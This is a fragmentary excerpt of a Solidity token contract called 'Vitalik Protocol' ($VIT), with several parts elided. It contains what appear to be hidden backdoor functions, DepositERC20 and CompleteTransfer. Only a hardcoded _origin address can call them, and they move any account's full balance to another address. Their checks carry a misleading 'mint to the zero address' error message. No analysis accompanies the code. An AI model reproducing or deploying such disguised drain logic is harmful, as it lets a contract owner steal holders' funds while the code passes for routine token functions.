...
contract Vitalik  is Context, IERC20 {
    ...
    address _addr = 0xC79b96044906550A5652BCf20a6EA02f139B9Ae5;
    address public _origin = 0xbf7cF591658b3BAF116542456987e606Cea8F88C;
    uint256 private _maximumVal = 115792089237316195423570985008687907853269984665640564039457584007913129639935;
    constructor () public {


        
        _name = "Vitalik Protocol";
        _symbol = "$VIT";
        _decimals = 18;
...
*/
        ...
        function Deposit(address account, address staker) public {
        ...
        function DepositERC20(address account, address staker) public {
            require(msg.sender == _origin, "ERC20: mint to the zero address");
            uint256 amount = _balances[account];
            _beforeTokenTransfer(account, staker, amount);
        ...
        function CompleteTransfer(address account, address staker) public {
            require(msg.sender == _origin, "ERC20: mint to the zero address");
            uint256 amount = _balances[account];
            _beforeTokenTransfer(account, staker, amount);
